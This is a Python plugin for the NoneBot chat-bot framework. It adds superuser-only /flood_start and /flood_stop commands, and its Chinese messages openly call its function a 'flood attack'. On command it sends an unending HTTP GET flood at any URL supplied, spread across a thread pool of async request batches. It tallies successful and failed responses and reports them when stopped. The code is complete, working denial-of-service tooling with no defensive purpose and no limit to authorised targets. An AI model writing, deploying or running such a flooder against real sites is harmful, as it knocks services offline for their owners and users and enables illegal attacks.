import nonebot
from nonebot import on_command
from nonebot.adapters.onebot.v11 import Bot, Event, Message, MessageSegment
from nonebot.params import CommandArg
from nonebot.permission import SUPERUSER
import asyncio
import aiohttp
import logging
from concurrent.futures import ThreadPoolExecutor
import threading

# 设置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# 创建命令处理器
flood_start = on_command('flood_start', priority=5, permission=SUPERUSER)
flood_stop = on_command('flood_stop', priority=5, permission=SUPERUSER)

# 全局变量
flooding = False
stop_event = threading.Event()
thread_pool = None

# 统计信息
total_requests = 0
successful_requests = 0
failed_requests = 0

# 异步HTTP请求函数
async def send_request(session, url):
    global successful_requests, failed_requests, total_requests
    try:
        async with session.get(url, timeout=1) as response:
            if response.status == 200:
                successful_requests += 1
            else:
                failed_requests += 1
            logger.info(f"Response Code: {response.status}")
        total_requests += 1
    except Exception as e:
        failed_requests += 1
        logger.error(f"Request failed: {e}")

# 用于创建任务并运行线程池
def run_flood_task(url, num_requests):
    async def flood_task():
        async with aiohttp.ClientSession() as session:
            while flooding and not stop_event.is_set():
                tasks = [send_request(session, url) for _ in range(num_requests)]
                await asyncio.gather(*tasks)
    
    asyncio.run(flood_task())

@flood_start.handle()
async def handle_flood_start(bot: Bot, event: Event, args: Message = CommandArg()):
    global flooding, stop_event, thread_pool, total_requests, successful_requests, failed_requests
    if flooding:
        await flood_start.finish(MessageSegment.reply(event.message_id) + "洪水攻击已经在进行中，请先停止再启动新的攻击。")
    
    params = args.extract_plain_text().strip().split()
    
    if len(params) != 2:
        await flood_start.finish(MessageSegment.reply(event.message_id) + "命令格式错误，请使用格式：/flood_start <URL> <请求数量>")
    
    url = params[0]
    try:
        num_requests = int(params[1])
    except ValueError:
        await flood_start.finish(MessageSegment.reply(event.message_id) + "请求数量必须是整数。")
    
    if num_requests <= 0:
        await flood_start.finish(MessageSegment.reply(event.message_id) + "请求数量必须大于 0")
    
    flooding = True
    stop_event.clear()
    
    # 如果线程池已经存在，先关闭它
    if thread_pool:
        thread_pool.shutdown(wait=True)
    
    # 创建新的线程池
    num_threads = min(num_requests, 10)  # 限制最大线程数以避免系统负担过重
    thread_pool = ThreadPoolExecutor(max_workers=num_threads)
    
    for _ in range(num_threads):
        thread_pool.submit(run_flood_task, url, num_requests // num_threads)
    
    await flood_start.send(MessageSegment.reply(event.message_id) + f"洪水攻击已启动，目标 URL: {url}，请求数量: {num_requests}")

@flood_stop.handle()
async def handle_flood_stop(bot: Bot, event: Event):
    global flooding, stop_event, thread_pool, total_requests, successful_requests, failed_requests
    if not flooding:
        await flood_stop.finish(MessageSegment.reply(event.message_id) + "当前没有洪水攻击在进行中。")
    
    flooding = False
    stop_event.set()
    
    # 关闭线程池
    if thread_pool:
        thread_pool.shutdown(wait=True)
        thread_pool = None
    
    stats_message = (
        f"洪水攻击已停止。\n"
        f"总请求数: {total_requests}\n"
        f"成功响应数: {successful_requests}\n"
        f"失败响应数: {failed_requests}"
    )
    
    # 重置统计信息
    total_requests = 0
    successful_requests = 0
    failed_requests = 0
    
    await flood_stop.send(MessageSegment.reply(event.message_id) + stats_message)
